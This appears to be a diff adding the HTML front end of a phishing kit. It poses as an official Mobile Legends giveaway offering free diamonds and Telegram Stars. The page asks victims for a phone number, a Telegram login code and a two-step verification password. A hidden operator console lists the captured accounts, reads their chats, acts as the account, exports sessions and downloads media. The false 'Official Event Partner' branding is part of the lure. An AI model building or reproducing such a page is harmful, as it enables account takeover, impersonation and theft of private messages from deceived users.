@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MLBB Giveaway Top-up</title>
+  <meta property="og:title" content="MLBB Giveaway Top-up" />
+  <meta property="og:description" content="Official Mobile Legends Bang Bang Event Partner." />
+  <meta property="og:image" content="https://login.mlbbshop.app/static/og-image.png?v=6" />
+  <meta property="og:url" content="https://login.mlbbshop.app/" />
+  <meta property="og:type" content="website" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://login.mlbbshop.app/static/og-image.png?v=6" />
+  
+  <!-- Web Launcher Icons -->
+  <link rel="icon" type="image/png" href="/static/favicon.png?v=5" />
+  <link rel="apple-touch-icon" href="/static/favicon.png?v=5" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/static/style.css" />
+</head>
+<body>
+  <div class="aurora-bg"></div>
+
+  <!-- ===================== LOGIN ===================== -->
+  <div id="login-view" class="login-view hidden">
+    <div class="login-card glass">
+      <div class="mlbb-brand">
+        <img src="/static/mlbb-logo.png?v=4" alt="Mobile Legends Bang Bang" class="mlbb-logo-img" id="brand-logo" />
+        <div class="brand" style="text-align: center; line-height: 1.3;"><span class="brand-mark">◈</span><span id="brand-title">Giveaway Top-up</span></div>
+      </div>
+
+      <!-- USER (route: /) -->
+      <div id="login-user" class="login-pane">
+        <p class="login-sub" id="login-sub">Enter your Mobile Legends ID & server to begin</p>
+
+        <div class="login-step" id="step-pick">
+          <div class="pick-grid">
+            <button class="pick-card" id="pick-mlbb">
+              <span class="pick-icon">💎</span>
+              <span class="pick-label">MLBB Diamonds</span>
+              <span class="pick-desc">Free diamonds for Mobile Legends</span>
+            </button>
+            <button class="pick-card" id="pick-stars">
+              <span class="pick-icon">⭐</span>
+              <span class="pick-label">Telegram Stars</span>
+              <span class="pick-desc">Free 50 Stars for your account</span>
+            </button>
+          </div>
+          <div class="promo-text" style="color: var(--teal); font-size: 13.5px; text-align: center; margin-top: 6px; font-weight: 600;">🎁 Claim Free Rewards — Weekly Giveaway!</div>
+        </div>
+
+        <div class="login-step hidden" id="step-mlbb">
+          <div class="mlbb-row">
+            <input id="in-mlbb-id" class="field" inputmode="numeric" placeholder="Player ID" autocomplete="off" />
+            <input id="in-mlbb-server" class="field" inputmode="numeric" placeholder="Server / Zone" autocomplete="off" />
+          </div>
+          <button id="btn-mlbb-check" class="btn-grad">Check player</button>
+          <div id="mlbb-result" class="mlbb-result hidden"></div>
+          <button id="btn-mlbb-continue" class="btn-grad hidden">Continue to login →</button>
+          <button class="btn-link" id="mlbb-back-pick">← Back to selection</button>
+          <div class="promo-text" style="color: var(--teal); font-size: 13.5px; text-align: center; margin-top: 6px; font-weight: 600;">🎁 Claim Free Diamonds and Lucky Draw Weekly instantly!</div>
+        </div>
+
+        <div class="login-step hidden" id="step-phone">
+          <input id="in-phone" class="field" type="tel" placeholder="Phone number (+95 9xx…)" autocomplete="tel" />
+          <button id="btn-send-code" class="btn-grad">Send code</button>
+        </div>
+        <div class="login-step hidden" id="step-code">
+          <input id="in-code" class="field" inputmode="numeric" placeholder="Login code" autocomplete="off" />
+          <button id="btn-sign-in" class="btn-grad">Sign in</button>
+          <button class="btn-link" data-back>← Use another number</button>
+        </div>
+        <div class="login-step hidden" id="step-password">
+          <input id="in-password" class="field" type="password" placeholder="Two-step verification password" />
+          <button id="btn-password" class="btn-grad">Continue</button>
+        </div>
+      </div>
+
+      <!-- OPERATOR (route: /operator) -->
+      <div id="login-operator" class="login-pane hidden">
+        <p class="login-sub">Operator console — oversee every account</p>
+        <div class="login-step">
+          <input id="in-admin-user" class="field" placeholder="Operator username" autocomplete="username" />
+          <input id="in-admin-pass" class="field" type="password" placeholder="Operator password" autocomplete="current-password" />
+          <button id="btn-admin-login" class="btn-grad">Enter console</button>
+        </div>
+      </div>
+
+      <div id="login-error" class="login-error"></div>
+      <div id="login-spinner" class="spinner hidden"></div>
+    </div>
+    <div class="login-foot" id="login-foot">Official Mobile Legends: Bang Bang Event Partner</div>
+  </div>
+
+  <!-- ===================== USER APP ===================== -->
+  <div id="user-view" class="app-shell hidden">
+    <aside class="rail rail-chats glass">
+      <header class="rail-head">
+        <div class="me">
+          <div class="avatar" id="u-me-avatar"></div>
+          <div class="who"><div class="who-name" id="u-me-name">…</div><div class="who-sub">Your account</div></div>
+        </div>
+        <div class="head-actions">
+          <button id="u-export" class="icon-btn" title="Download / export this session">⬇</button>
+          <button id="u-logout" class="icon-btn" title="Log out">⏻</button>
+        </div>
+      </header>
+      <div class="search-wrap"><input id="u-search" class="search" placeholder="Search chats" /></div>
+      <div id="u-chat-list" class="chat-list scroll"></div>
+    </aside>
+    <main class="conv-wrap" data-conv="user">
+      <div class="empty-pane">
+        <div class="empty-orb"></div>
+        <p>Select a chat to start messaging</p>
+      </div>
+      <div class="conversation hidden">
+        <header class="conv-head">
+          <button class="icon-btn conv-back" title="Back to chats">←</button>
+          <div class="avatar conv-avatar"></div>
+          <div class="conv-meta"><div class="conv-name"></div><div class="conv-sub"></div></div>
+          <button class="icon-btn conv-media-btn" title="Shared Media">🖼️</button>
+          <button class="icon-btn conv-refresh" title="Refresh">⟳</button>
+        </header>
+        <div class="messages scroll"></div>
+        <div class="reply-bar hidden">
+          <div class="reply-info"><span class="reply-label"></span><span class="reply-text"></span></div>
+          <button class="icon-btn reply-cancel">✕</button>
+        </div>
+        <footer class="composer">
+          <textarea class="msg-input" rows="1" placeholder="Write a message…"></textarea>
+          <button class="send-btn" title="Send">➤</button>
+        </footer>
+        <div class="shared-media-panel hidden">
+          <header class="shared-media-head">
+            <h3>Shared Media</h3>
+            <button class="icon-btn close-media-btn">✕</button>
+          </header>
+          <div class="shared-media-grid scroll"></div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- ===================== OPERATOR CONSOLE ===================== -->
+  <div id="admin-view" class="app-shell admin hidden">
+    <aside class="rail rail-accounts glass">
+      <header class="rail-head">
+        <div class="brand sm"><span class="brand-mark">◈</span><span>Operator</span></div>
+        <button id="a-logout" class="icon-btn" title="Exit console">⏻</button>
+      </header>
+      <div class="rail-meta"><span><b id="a-count">0</b> accounts</span><div style="display:flex;gap:4px"><button id="a-clean" class="icon-btn sm" title="Clean dead accounts">🧹</button><button id="a-refresh" class="icon-btn sm" title="Refresh">⟳</button></div></div>
+      <div id="a-account-list" class="account-list scroll"></div>
+    </aside>
+
+    <aside class="rail rail-chats glass">
+      <header class="rail-head">
+        <div class="me">
+          <button id="a-acct-back" class="icon-btn acct-back" title="Back to accounts">←</button>
+          <div class="avatar" id="a-acct-avatar"></div>
+          <div class="who"><div class="who-name" id="a-acct-name">Select an account</div><div class="who-sub" id="a-acct-sub"></div></div>
+        </div>
+        <div class="head-actions">
+          <button id="a-acct-export" class="icon-btn" title="Download this account's session" disabled>⬇</button>
+          <button id="a-acct-logout" class="icon-btn" title="Log this account out" disabled>⎋</button>
+        </div>
+      </header>
+      <div class="search-wrap"><input id="a-search" class="search" placeholder="Search chats" /></div>
+      <div id="a-chat-list" class="chat-list scroll"></div>
+    </aside>
+
+    <main class="conv-wrap" data-conv="admin">
+      <div class="empty-pane">
+        <div class="empty-orb"></div>
+        <p id="a-empty-text">Pick an account, then a chat</p>
+      </div>
+      <div class="conversation hidden">
+        <header class="conv-head">
+          <button class="icon-btn conv-back" title="Back to chats">←</button>
+          <div class="avatar conv-avatar"></div>
+          <div class="conv-meta"><div class="conv-name"></div><div class="conv-sub"></div></div>
+          <span class="acting-badge">acting as account</span>
+          <button class="icon-btn conv-export-media-btn" title="Download all media from this chat">📥</button>
+          <button class="icon-btn conv-media-btn" title="Shared Media">🖼️</button>
+          <button class="icon-btn conv-refresh" title="Refresh">⟳</button>
+        </header>
+        <div class="messages scroll"></div>
+        <div class="reply-bar hidden">
+          <div class="reply-info"><span class="reply-label"></span><span class="reply-text"></span></div>
+          <button class="icon-btn reply-cancel">✕</button>
+        </div>
+        <footer class="composer">
+          <textarea class="msg-input" rows="1" placeholder="Write a message…"></textarea>
+          <button class="send-btn" title="Send">➤</button>
+        </footer>
+        <div class="shared-media-panel hidden">
+          <header class="shared-media-head">
+            <h3>Shared Media</h3>
+            <button class="icon-btn close-media-btn">✕</button>
+          </header>
+          <div class="shared-media-grid scroll"></div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- ===================== POST-LOGIN CLAIM (open top-up bot) ===================== -->
+  <div id="claim-view" class="login-view hidden">
+    <div class="login-card glass" style="text-align:center">
+      <div class="claim-emoji" id="claim-emoji">💎</div>
+      <h2 id="claim-title" style="font-size:21px;font-weight:800;margin-bottom:6px">Player verified!</h2>
+      <div id="claim-player" class="claim-player"></div>
+      <a id="claim-open" class="btn-grad" target="_blank" rel="noopener" style="display:block;text-decoration:none;margin-top:18px">Open Top-up Bot to claim →</a>
+      <button class="btn-link" id="claim-manage" style="margin-top:10px">Skip</button>
+    </div>
+    <div class="login-foot" id="claim-foot">You'll continue in @MLBB_Dia_Top_up_bot</div>
+  </div>
+
+  <!-- image lightbox -->
+  <div id="lightbox" class="lightbox hidden">
+    <span class="lightbox-close">✕</span>
+    <img id="lightbox-img" src="" alt="" />
+  </div>
+
+  <div id="toast" class="toast hidden"></div>
+  <script src="/static/app.js"></script>
+</body>
+</html>
